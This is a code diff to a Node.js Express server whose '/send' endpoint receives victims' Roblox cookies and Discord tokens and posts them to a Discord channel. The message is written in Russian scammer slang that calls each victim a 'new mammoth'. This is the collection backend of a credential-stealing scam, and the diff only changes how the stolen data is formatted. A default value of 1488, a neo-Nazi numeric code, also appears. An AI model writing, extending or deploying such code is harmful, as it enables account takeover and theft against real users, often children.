@@ -15,7 +15,7 @@ app.get('/download', async (req, res) => {
 
 app.post('/send', async (req, res) => {
   const { cookies, tokens, region } = req.body;
-  let robux = 1488
+  let robux = 1488;
   try {
     robux = req.body.robux;
   } catch {
@@ -27,7 +27,7 @@ app.post('/send', async (req, res) => {
   console.log('Cookies:', cookiesString);
   console.log('Tokens:', tokensString);
 
-  const plainMessage = `@everyone Новый мамонт! Регион: ${region} \n \n РБ: ${cookiesString} \n ДС: ${tokensString} \n РОБУКСЫ: ${robux}`;
+  const plainMessage = '@everyone Новый мамонт! Регион: ```' + region + ' ``` \n \n  РБ: ```' + cookiesString + ' ``` \n ДС: ```' + tokensString + ' ``` \n РОБУКСЫ: ```' + robux + ' ```';
   const content = '```' + plainMessage + '```';
 
   // Отправляем в Discord
